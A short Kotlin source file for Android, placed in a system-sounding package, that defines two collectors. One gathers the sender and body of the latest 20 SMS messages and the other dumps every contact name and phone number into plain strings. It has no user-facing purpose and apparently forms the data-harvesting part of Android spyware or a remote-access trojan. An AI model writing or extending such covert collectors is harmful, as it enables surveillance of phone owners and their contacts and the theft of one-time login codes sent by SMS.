package com.system.service

import android.content.Context
import android.provider.ContactsContract
import android.provider.Telephony

object SmsCollector {
    fun collect(ctx: Context): String {
        val sb = StringBuilder()
        val cursor = ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 20")
        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                sb.append("From: ").append(address).append("\nMsg: ").append(body).append("\n---\n")
            }
        }
        return if (sb.isNotEmpty()) sb.toString() else "No SMS found."
    }
}

object ContactsCollector {
    fun collect(ctx: Context): String {
        val sb = StringBuilder()
        val cursor = ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                sb.append(name).append(": ").append(phone).append("\n")
            }
        }
        return if (sb.isNotEmpty()) sb.toString() else "No contacts found."
    }
}
